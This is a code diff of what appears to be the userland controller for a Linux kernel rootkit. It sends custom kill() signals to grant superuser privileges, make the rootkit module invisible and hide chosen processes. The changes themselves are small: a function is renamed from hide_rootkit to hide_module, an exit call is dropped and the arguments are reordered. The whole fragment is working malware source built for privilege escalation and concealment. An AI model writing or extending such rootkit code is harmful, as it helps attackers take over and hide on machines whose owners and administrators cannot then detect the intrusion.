@@ -24,12 +24,10 @@ int kill_superuser() {
 		print_error("Couldn't elevate your privileges.");
 	}
 
-	_exit(0);
-
 	return ret;
 }
 
-int	hide_rootkit() { 
+int	hide_module() { 
 	int ret = kill(0, SIGMODINVIS); 
 	
 	if (ret == 0) {
@@ -53,19 +51,19 @@ int hide_process(int pid) {
 	return ret;
 }
 
-int kill_run(int pid, const char *action) {
+int kill_run(char *action, int pid) {
 	
-	const char *actions[] = { "superuser", "hide_rootkit", "hide_process", NULL };
+	const char *actions[] = { "superuser", "hide_module", "hide_process", NULL };
 	if (action == NULL) {
 		print_error("Kill action not specified.");
-		print_list("Here are all the actions you can do: ", actions);
+		print_list("here are all the actions you can do: ", actions);
 		return -2;
 	}
 
 	if (!strncmp(action, actions[0], 10)) {
 		return kill_superuser();
 	} else if (!strncmp(action, actions[1], 13)) {
-		return hide_rootkit();
+		return hide_module();
 	} else if (!strncmp(action, actions[2], 14)) {
 		return hide_process(pid);
 	}
